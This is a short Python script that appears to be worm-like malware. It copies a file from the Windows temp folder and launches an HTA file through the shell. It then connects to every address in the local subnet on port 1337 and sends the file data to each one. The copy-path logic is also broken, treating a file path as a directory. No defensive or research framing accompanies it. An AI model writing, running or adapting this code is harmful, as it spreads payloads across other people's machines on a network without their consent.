import socket
import os
import subprocess
import random
import string
 
# Define icyr.cpp
file_path = (os.path.expandvars("%Temp%\icyr.cpp"))
 
# Open the file
with open(file_path, 'rb') as f:
    file_data = f.read()
 
# Generate a random string for the file name
file_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".py"
 
# Get the path of the copied file
copied_file_path = os.path.join(os.path.expandvars("%Temp%\icyr.cpp"), file_name)
 
# Check if the directory exists, create it if it doesn't
if not os.path.exists(os.path.dirname(copied_file_path)):
    os.makedirs(os.path.dirname(copied_file_path))
 
# Save the received data to the new file
with open(copied_file_path, "wb") as f:
    f.write(file_data)
 
# Open gax7
subprocess.run(["start gax7.hta"], shell=True)
 
# Get the local IP address
ip = socket.gethostbyname(socket.gethostname())
 
# Get the subnet
subnet = '.'.join(ip.split('.')[:-1]) + '.'
 
# Iterate through all IP addresses in the subnet
for i in range(1, 256):
    try:
        # Create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the IP address
        s.connect((subnet + str(i), 1337))
        # Send the file data
        s.sendall(file_data)
        # Save the received data to a new file
        with open(copied_file_path, "wb") as f:
            f.write(file_data)
        # Close the socket
        s.close()
    except:
        # If the connection fails, move on to the next IP
        pass